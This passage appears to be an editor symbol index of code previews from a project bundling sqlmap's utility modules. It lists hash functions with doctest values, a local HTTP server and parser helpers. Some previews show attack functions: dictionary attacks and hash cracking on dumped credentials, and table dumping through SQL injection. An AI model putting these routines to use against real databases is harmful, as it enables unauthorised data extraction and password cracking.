        "peekOfCode": "def django_md5_passwd(password, salt, **kwargs):\n    \"\"\"\n    Reference: https://github.com/jay0lee/GAM/blob/master/src/passlib/handlers/django.py\n    >>> django_md5_passwd(password='testpass', salt='salt')\n    'md5$salt$972141bcbcb6a0acc96e92309175b3c5'\n    \"\"\"\n    return \"md5$%s$%s\" % (salt, md5(getBytes(salt) + getBytes(password)).hexdigest())\ndef django_sha1_passwd(password, salt, **kwargs):\n    \"\"\"\n    Reference: https://github.com/jay0lee/GAM/blob/master/src/passlib/handlers/django.py",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "django_sha1_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def django_sha1_passwd(password, salt, **kwargs):\n    \"\"\"\n    Reference: https://github.com/jay0lee/GAM/blob/master/src/passlib/handlers/django.py\n    >>> django_sha1_passwd(password='testpass', salt='salt')\n    'sha1$salt$6ce0e522aba69d8baa873f01420fccd0250fc5b2'\n    \"\"\"\n    return \"sha1$%s$%s\" % (salt, sha1(getBytes(salt) + getBytes(password)).hexdigest())\ndef vbulletin_passwd(password, salt, **kwargs):\n    \"\"\"\n    Reference: https://stackoverflow.com/a/2202810",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "vbulletin_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def vbulletin_passwd(password, salt, **kwargs):\n    \"\"\"\n    Reference: https://stackoverflow.com/a/2202810\n    >>> vbulletin_passwd(password='testpass', salt='salt')\n    '85c4d8ea77ebef2236fb7e9d24ba9482:salt'\n    \"\"\"\n    return \"%s:%s\" % (md5(binascii.hexlify(md5(getBytes(password)).digest()) + getBytes(salt)).hexdigest(), salt)\ndef phpass_passwd(password, salt, count, prefix, **kwargs):\n    \"\"\"\n    Reference(s):",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "phpass_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def phpass_passwd(password, salt, count, prefix, **kwargs):\n    \"\"\"\n    Reference(s):\n        https://web.archive.org/web/20120219120128/packetstormsecurity.org/files/74448/phpassbrute.py.txt\n        http://scriptserver.mainframe8.com/wordpress_password_hasher.php\n        https://www.openwall.com/phpass/\n        https://github.com/jedie/django-phpBB3/blob/master/django_phpBB3/hashers.py\n    >>> phpass_passwd(password='testpass', salt='aD9ZLmkp', count=2048, prefix='$P$')\n    '$P$9aD9ZLmkpsN4A83G8MefaaP888gVKX0'\n    >>> phpass_passwd(password='testpass', salt='Pb1j9gSb', count=2048, prefix='$H$')",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "storeHashesToFile",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def storeHashesToFile(attack_dict):\n    if not attack_dict:\n        return\n    items = OrderedSet()\n    for user, hashes in attack_dict.items():\n        for hash_ in hashes:\n            hash_ = hash_.split()[0] if hash_ and hash_.strip() else hash_\n            if hash_ and hash_ != NULL and hashRecognition(hash_):\n                item = None\n                if user and not user.startswith(DUMMY_USER_PREFIX):",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "attackCachedUsersPasswords",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def attackCachedUsersPasswords():\n    if kb.data.cachedUsersPasswords:\n        results = dictionaryAttack(kb.data.cachedUsersPasswords)\n        lut = {}\n        for (_, hash_, password) in results:\n            lut[hash_.lower()] = password\n        for user in kb.data.cachedUsersPasswords:\n            for i in xrange(len(kb.data.cachedUsersPasswords[user])):\n                if (kb.data.cachedUsersPasswords[user][i] or \"\").strip():\n                    value = kb.data.cachedUsersPasswords[user][i].lower().split()[0]",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "attackDumpedTable",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def attackDumpedTable():\n    if kb.data.dumpedTable:\n        table = kb.data.dumpedTable\n        columns = list(table.keys())\n        count = table[\"__infos__\"][\"count\"]\n        if not count:\n            return\n        debugMsg = \"analyzing table dump for possible password hashes\"\n        logger.debug(debugMsg)\n        found = False",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "hashRecognition",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def hashRecognition(value):\n    \"\"\"\n    >>> hashRecognition(\"179ad45c6ce2cb97cf1029e212046e81\") == HASH.MD5_GENERIC\n    True\n    >>> hashRecognition(\"S:2BFCFDF5895014EE9BB2B9BA067B01E0389BB5711B7B5F82B7235E9E182C\") == HASH.ORACLE\n    True\n    >>> hashRecognition(\"foobar\") == None\n    True\n    \"\"\"\n    retVal = None",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "dictionaryAttack",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def dictionaryAttack(attack_dict):\n    global _multiprocessing\n    suffix_list = [\"\"]\n    custom_wordlist = [\"\"]\n    hash_regexes = []\n    results = []\n    resumes = []\n    user_hash = []\n    processException = False\n    foundHash = False",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "crackHashFile",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def crackHashFile(hashFile):\n    i = 0\n    attack_dict = {}\n    for line in getFileItems(conf.hashFile):\n        if ':' in line:\n            user, hash_ = line.split(':', 1)\n            attack_dict[user] = [hash_]\n        else:\n            attack_dict[\"%s%d\" % (DUMMY_USER_PREFIX, i)] = [line]\n            i += 1",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "_multiprocessing",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "_multiprocessing = None\nimport base64\nimport binascii\nimport gc\nimport math\nimport os\nimport re\nimport tempfile\nimport time\nimport zipfile",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "__functions__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "__functions__ = {\n    HASH.MYSQL: mysql_passwd,\n    HASH.MYSQL_OLD: mysql_old_passwd,\n    HASH.POSTGRES: postgres_passwd,\n    HASH.MSSQL: mssql_passwd,\n    HASH.MSSQL_OLD: mssql_old_passwd,\n    HASH.MSSQL_NEW: mssql_new_passwd,\n    HASH.ORACLE: oracle_passwd,\n    HASH.ORACLE_OLD: oracle_old_passwd,\n    HASH.MD5_GENERIC: md5_generic_passwd,",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "HashDB",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hashdb",
        "description": "VulnScan.modules.sqlmap.lib.utils.hashdb",
        "peekOfCode": "class HashDB(object):\n    def __init__(self, filepath):\n        self.filepath = filepath\n        self._write_cache = {}\n        self._cache_lock = threading.Lock()\n        self._connections = []\n    def _get_cursor(self):\n        threadData = getCurrentThreadData()\n        if threadData.hashDBCursor is None:\n            try:",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hashdb",
        "documentation": {}
    },
    {
        "label": "ThreadingServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "description": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "peekOfCode": "class ThreadingServer(_socketserver.ThreadingMixIn, _BaseHTTPServer.HTTPServer):\n    def finish_request(self, *args, **kwargs):\n        try:\n            _BaseHTTPServer.HTTPServer.finish_request(self, *args, **kwargs)\n        except Exception:\n            if DEBUG:\n                traceback.print_exc()\nclass ReqHandler(_BaseHTTPServer.BaseHTTPRequestHandler):\n    def do_GET(self):\n        path, query = self.path.split('?', 1) if '?' in self.path else (self.path, \"\")",
        "detail": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "documentation": {}
    },
    {
        "label": "ReqHandler",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "description": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "peekOfCode": "class ReqHandler(_BaseHTTPServer.BaseHTTPRequestHandler):\n    def do_GET(self):\n        path, query = self.path.split('?', 1) if '?' in self.path else (self.path, \"\")\n        params = {}\n        content = None\n        if query:\n            params.update(_urllib.parse.parse_qs(query))\n        for key in params:\n            if params[key]:\n                params[key] = params[key][-1]",
        "detail": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "documentation": {}
    },
    {
        "label": "start_httpd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "description": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "peekOfCode": "def start_httpd():\n    server = ThreadingServer((HTTP_ADDRESS, HTTP_PORT), ReqHandler)\n    thread = threading.Thread(target=server.serve_forever)\n    thread.daemon = True\n    thread.start()\n    print(\"[i] running HTTP server at '%s:%d'\" % (HTTP_ADDRESS, HTTP_PORT))\nif __name__ == \"__main__\":\n    try:\n        start_httpd()\n        while True:",
        "detail": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "documentation": {}
    },
    {
        "label": "HTTP_ADDRESS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "description": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "peekOfCode": "HTTP_ADDRESS = \"0.0.0.0\"\nHTTP_PORT = 8951\nDEBUG = True\nHTML_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), \"..\", \"..\", \"data\", \"html\"))\nDISABLED_CONTENT_EXTENSIONS = (\".py\", \".pyc\", \".md\", \".txt\", \".bak\", \".conf\", \".zip\", \"~\")\nclass ThreadingServer(_socketserver.ThreadingMixIn, _BaseHTTPServer.HTTPServer):\n    def finish_request(self, *args, **kwargs):\n        try:\n            _BaseHTTPServer.HTTPServer.finish_request(self, *args, **kwargs)\n        except Exception:",
        "detail": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "documentation": {}
    },
    {
        "label": "HTTP_PORT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "description": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "peekOfCode": "HTTP_PORT = 8951\nDEBUG = True\nHTML_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), \"..\", \"..\", \"data\", \"html\"))\nDISABLED_CONTENT_EXTENSIONS = (\".py\", \".pyc\", \".md\", \".txt\", \".bak\", \".conf\", \".zip\", \"~\")\nclass ThreadingServer(_socketserver.ThreadingMixIn, _BaseHTTPServer.HTTPServer):\n    def finish_request(self, *args, **kwargs):\n        try:\n            _BaseHTTPServer.HTTPServer.finish_request(self, *args, **kwargs)\n        except Exception:\n            if DEBUG:",
        "detail": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "documentation": {}
    },
    {
        "label": "DEBUG",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "description": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "peekOfCode": "DEBUG = True\nHTML_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), \"..\", \"..\", \"data\", \"html\"))\nDISABLED_CONTENT_EXTENSIONS = (\".py\", \".pyc\", \".md\", \".txt\", \".bak\", \".conf\", \".zip\", \"~\")\nclass ThreadingServer(_socketserver.ThreadingMixIn, _BaseHTTPServer.HTTPServer):\n    def finish_request(self, *args, **kwargs):\n        try:\n            _BaseHTTPServer.HTTPServer.finish_request(self, *args, **kwargs)\n        except Exception:\n            if DEBUG:\n                traceback.print_exc()",
        "detail": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "documentation": {}
    },
    {
        "label": "HTML_DIR",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "description": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "peekOfCode": "HTML_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), \"..\", \"..\", \"data\", \"html\"))\nDISABLED_CONTENT_EXTENSIONS = (\".py\", \".pyc\", \".md\", \".txt\", \".bak\", \".conf\", \".zip\", \"~\")\nclass ThreadingServer(_socketserver.ThreadingMixIn, _BaseHTTPServer.HTTPServer):\n    def finish_request(self, *args, **kwargs):\n        try:\n            _BaseHTTPServer.HTTPServer.finish_request(self, *args, **kwargs)\n        except Exception:\n            if DEBUG:\n                traceback.print_exc()\nclass ReqHandler(_BaseHTTPServer.BaseHTTPRequestHandler):",
        "detail": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "documentation": {}
    },
    {
        "label": "DISABLED_CONTENT_EXTENSIONS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "description": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "peekOfCode": "DISABLED_CONTENT_EXTENSIONS = (\".py\", \".pyc\", \".md\", \".txt\", \".bak\", \".conf\", \".zip\", \"~\")\nclass ThreadingServer(_socketserver.ThreadingMixIn, _BaseHTTPServer.HTTPServer):\n    def finish_request(self, *args, **kwargs):\n        try:\n            _BaseHTTPServer.HTTPServer.finish_request(self, *args, **kwargs)\n        except Exception:\n            if DEBUG:\n                traceback.print_exc()\nclass ReqHandler(_BaseHTTPServer.BaseHTTPRequestHandler):\n    def do_GET(self):",
        "detail": "VulnScan.modules.sqlmap.lib.utils.httpd",
        "documentation": {}
    },
    {
        "label": "pivotDumpTable",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.pivotdumptable",
        "description": "VulnScan.modules.sqlmap.lib.utils.pivotdumptable",
        "peekOfCode": "def pivotDumpTable(table, colList, count=None, blind=True, alias=None):\n    lengths = {}\n    entries = {}\n    dumpNode = queries[Backend.getIdentifiedDbms()].dump_table.blind\n    validColumnList = False\n    validPivotValue = False\n    if count is None:\n        query = dumpNode.count % table\n        query = agent.whereQuery(query)\n        count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS) if blind else inject.getValue(query, blind=False, time=False, expected=EXPECTED.INT)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.pivotdumptable",
        "documentation": {}
    },
    {
        "label": "ProgressBar",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.progress",
        "description": "VulnScan.modules.sqlmap.lib.utils.progress",
        "peekOfCode": "class ProgressBar(object):\n    \"\"\"\n    This class defines methods to update and draw a progress bar\n    \"\"\"\n    def __init__(self, minValue=0, maxValue=10, totalWidth=None):\n        self._progBar = \"[]\"\n        self._min = int(minValue)\n        self._max = int(maxValue)\n        self._span = max(self._max - self._min, 0.001)\n        self._width = totalWidth if totalWidth else conf.progressWidth",
        "detail": "VulnScan.modules.sqlmap.lib.utils.progress",
        "documentation": {}
    },
    {
        "label": "purge",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.purge",
        "description": "VulnScan.modules.sqlmap.lib.utils.purge",
        "peekOfCode": "def purge(directory):\n    \"\"\"\n    Safely removes content from a given directory\n    \"\"\"\n    if not os.path.isdir(directory):\n        warnMsg = \"skipping purging of directory '%s' as it does not exist\" % directory\n        logger.warning(warnMsg)\n        return\n    infoMsg = \"purging content of directory '%s'...\" % directory\n    logger.info(infoMsg)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.purge",
        "documentation": {}
    },
    {
        "label": "safecharencode",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "description": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "peekOfCode": "def safecharencode(value):\n    \"\"\"\n    Returns safe representation of a given basestring value\n    >>> safecharencode(u'test123') == u'test123'\n    True\n    >>> safecharencode(u'test\\x01\\x02\\xaf') == u'test\\\\\\\\x01\\\\\\\\x02\\\\xaf'\n    True\n    \"\"\"\n    retVal = value\n    if isinstance(value, string_types):",
        "detail": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "safechardecode",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "description": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "peekOfCode": "def safechardecode(value, binary=False):\n    \"\"\"\n    Reverse function to safecharencode\n    \"\"\"\n    retVal = value\n    if isinstance(value, string_types):\n        retVal = retVal.replace('\\\\\\\\', SLASH_MARKER)\n        while True:\n            match = re.search(HEX_ENCODED_CHAR_REGEX, retVal)\n            if match:",
        "detail": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "PY3",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "description": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "peekOfCode": "PY3 = sys.version_info >= (3, 0)\nif PY3:\n    xrange = range\n    text_type = str\n    string_types = (str,)\n    unichr = chr\nelse:\n    text_type = unicode\n    string_types = (basestring,)\n# Regex used for recognition of hex encoded characters",
        "detail": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "HEX_ENCODED_CHAR_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "description": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "peekOfCode": "HEX_ENCODED_CHAR_REGEX = r\"(?P<result>\\\\x[0-9A-Fa-f]{2})\"\n# Raw chars that will be safe encoded to their slash (\\) representations (e.g. newline to \\n)\nSAFE_ENCODE_SLASH_REPLACEMENTS = \"\\t\\n\\r\\x0b\\x0c\"\n# Characters that don't need to be safe encoded\nSAFE_CHARS = \"\".join([_ for _ in string.printable.replace('\\\\', '') if _ not in SAFE_ENCODE_SLASH_REPLACEMENTS])\n# Prefix used for hex encoded values\nHEX_ENCODED_PREFIX = r\"\\x\"\n# Strings used for temporary marking of hex encoded prefixes (to prevent double encoding)\nHEX_ENCODED_PREFIX_MARKER = \"__HEX_ENCODED_PREFIX__\"\n# String used for temporary marking of slash characters",
        "detail": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "SAFE_ENCODE_SLASH_REPLACEMENTS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "description": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "peekOfCode": "SAFE_ENCODE_SLASH_REPLACEMENTS = \"\\t\\n\\r\\x0b\\x0c\"\n# Characters that don't need to be safe encoded\nSAFE_CHARS = \"\".join([_ for _ in string.printable.replace('\\\\', '') if _ not in SAFE_ENCODE_SLASH_REPLACEMENTS])\n# Prefix used for hex encoded values\nHEX_ENCODED_PREFIX = r\"\\x\"\n# Strings used for temporary marking of hex encoded prefixes (to prevent double encoding)\nHEX_ENCODED_PREFIX_MARKER = \"__HEX_ENCODED_PREFIX__\"\n# String used for temporary marking of slash characters\nSLASH_MARKER = \"__SLASH__\"\ndef safecharencode(value):",
        "detail": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "SAFE_CHARS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "description": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "peekOfCode": "SAFE_CHARS = \"\".join([_ for _ in string.printable.replace('\\\\', '') if _ not in SAFE_ENCODE_SLASH_REPLACEMENTS])\n# Prefix used for hex encoded values\nHEX_ENCODED_PREFIX = r\"\\x\"\n# Strings used for temporary marking of hex encoded prefixes (to prevent double encoding)\nHEX_ENCODED_PREFIX_MARKER = \"__HEX_ENCODED_PREFIX__\"\n# String used for temporary marking of slash characters\nSLASH_MARKER = \"__SLASH__\"\ndef safecharencode(value):\n    \"\"\"\n    Returns safe representation of a given basestring value",
        "detail": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "HEX_ENCODED_PREFIX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "description": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "peekOfCode": "HEX_ENCODED_PREFIX = r\"\\x\"\n# Strings used for temporary marking of hex encoded prefixes (to prevent double encoding)\nHEX_ENCODED_PREFIX_MARKER = \"__HEX_ENCODED_PREFIX__\"\n# String used for temporary marking of slash characters\nSLASH_MARKER = \"__SLASH__\"\ndef safecharencode(value):\n    \"\"\"\n    Returns safe representation of a given basestring value\n    >>> safecharencode(u'test123') == u'test123'\n    True",
        "detail": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "HEX_ENCODED_PREFIX_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "description": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "peekOfCode": "HEX_ENCODED_PREFIX_MARKER = \"__HEX_ENCODED_PREFIX__\"\n# String used for temporary marking of slash characters\nSLASH_MARKER = \"__SLASH__\"\ndef safecharencode(value):\n    \"\"\"\n    Returns safe representation of a given basestring value\n    >>> safecharencode(u'test123') == u'test123'\n    True\n    >>> safecharencode(u'test\\x01\\x02\\xaf') == u'test\\\\\\\\x01\\\\\\\\x02\\\\xaf'\n    True",
        "detail": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "SLASH_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "description": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "peekOfCode": "SLASH_MARKER = \"__SLASH__\"\ndef safecharencode(value):\n    \"\"\"\n    Returns safe representation of a given basestring value\n    >>> safecharencode(u'test123') == u'test123'\n    True\n    >>> safecharencode(u'test\\x01\\x02\\xaf') == u'test\\\\\\\\x01\\\\\\\\x02\\\\xaf'\n    True\n    \"\"\"\n    retVal = value",
        "detail": "VulnScan.modules.sqlmap.lib.utils.safe2bin",
        "documentation": {}
    },
    {
        "label": "search",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.search",
        "description": "VulnScan.modules.sqlmap.lib.utils.search",
        "peekOfCode": "def search(dork):\n    pushValue(kb.choices.redirect)\n    kb.choices.redirect = REDIRECTION.YES\n    try:\n        return _search(dork)\n    except SqlmapBaseException as ex:\n        if conf.proxyList:\n            logger.critical(getSafeExString(ex))\n            warnMsg = \"changing proxy\"\n            logger.warning(warnMsg)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.search",
        "documentation": {}
    },
    {
        "label": "setHTTPHandlers",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.search",
        "description": "VulnScan.modules.sqlmap.lib.utils.search",
        "peekOfCode": "def setHTTPHandlers():  # Cross-referenced function\n    raise NotImplementedError",
        "detail": "VulnScan.modules.sqlmap.lib.utils.search",
        "documentation": {}
    },
    {
        "label": "SGMLParseError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "description": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "peekOfCode": "class SGMLParseError(RuntimeError):\n    \"\"\"Exception raised for all parse errors.\"\"\"\n    pass\n# SGML parser base class -- find tags and call handler functions.\n# Usage: p = SGMLParser(); p.feed(data); ...; p.close().\n# The dtd is defined by deriving a class which defines methods\n# with special names to handle tags: start_foo and end_foo to handle\n# <foo> and </foo>, respectively, or do_foo to handle <foo> by itself.\n# (Tags are converted to lower case for this purpose.)  The data\n# between tags is passed to the parser by calling self.handle_data()",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "documentation": {}
    },
    {
        "label": "SGMLParser",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "description": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "peekOfCode": "class SGMLParser(markupbase.ParserBase):\n    # Definition of entities -- derived classes may override\n    entity_or_charref = re.compile('&(?:'\n                                   '([a-zA-Z][-.a-zA-Z0-9]*)|#([0-9]+)'\n                                   ')(;?)')\n    def __init__(self, verbose=0):\n        \"\"\"Initialize and reset this instance.\"\"\"\n        self.verbose = verbose\n        self.reset()\n    def reset(self):",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "documentation": {}
    },
    {
        "label": "TestSGMLParser",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "description": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "peekOfCode": "class TestSGMLParser(SGMLParser):\n    def __init__(self, verbose=0):\n        self.testdata = \"\"\n        SGMLParser.__init__(self, verbose)\n    def handle_data(self, data):\n        self.testdata = self.testdata + data\n        if len(repr(self.testdata)) >= 70:\n            self.flush()\n    def flush(self):\n        data = self.testdata",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "documentation": {}
    },
    {
        "label": "test",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "description": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "peekOfCode": "def test(args=None):\n    import sys\n    if args is None:\n        args = sys.argv[1:]\n    if args and args[0] == '-s':\n        args = args[1:]\n        klass = SGMLParser\n    else:\n        klass = TestSGMLParser\n    if args:",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "documentation": {}
    },
    {
        "label": "__all__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "description": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "peekOfCode": "__all__ = [\"SGMLParser\", \"SGMLParseError\"]\n# Regular expressions used for parsing\ninteresting = re.compile('[&<]')\nincomplete = re.compile('&([a-zA-Z][a-zA-Z0-9]*|#[0-9]*)?|'\n                        '<([a-zA-Z][^<>]*|'\n                        '/([a-zA-Z][^<>]*)?|'\n                        '![^<>]*)?')\nentityref = re.compile('&([a-zA-Z][-.a-zA-Z0-9]*)[^a-zA-Z0-9]')\ncharref = re.compile('&#([0-9]+)[^0-9]')\nstarttagopen = re.compile('<[>a-zA-Z]')",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "documentation": {}
    },
    {
        "label": "interesting",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "description": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "peekOfCode": "interesting = re.compile('[&<]')\nincomplete = re.compile('&([a-zA-Z][a-zA-Z0-9]*|#[0-9]*)?|'\n                        '<([a-zA-Z][^<>]*|'\n                        '/([a-zA-Z][^<>]*)?|'\n                        '![^<>]*)?')\nentityref = re.compile('&([a-zA-Z][-.a-zA-Z0-9]*)[^a-zA-Z0-9]')\ncharref = re.compile('&#([0-9]+)[^0-9]')\nstarttagopen = re.compile('<[>a-zA-Z]')\nshorttagopen = re.compile('<[a-zA-Z][-.a-zA-Z0-9]*/')\nshorttag = re.compile('<([a-zA-Z][-.a-zA-Z0-9]*)/([^/]*)/')",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "documentation": {}
    },
    {
        "label": "incomplete",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "description": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "peekOfCode": "incomplete = re.compile('&([a-zA-Z][a-zA-Z0-9]*|#[0-9]*)?|'\n                        '<([a-zA-Z][^<>]*|'\n                        '/([a-zA-Z][^<>]*)?|'\n                        '![^<>]*)?')\nentityref = re.compile('&([a-zA-Z][-.a-zA-Z0-9]*)[^a-zA-Z0-9]')\ncharref = re.compile('&#([0-9]+)[^0-9]')\nstarttagopen = re.compile('<[>a-zA-Z]')\nshorttagopen = re.compile('<[a-zA-Z][-.a-zA-Z0-9]*/')\nshorttag = re.compile('<([a-zA-Z][-.a-zA-Z0-9]*)/([^/]*)/')\npiclose = re.compile('>')",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "documentation": {}
    },
    {
        "label": "entityref",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "description": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
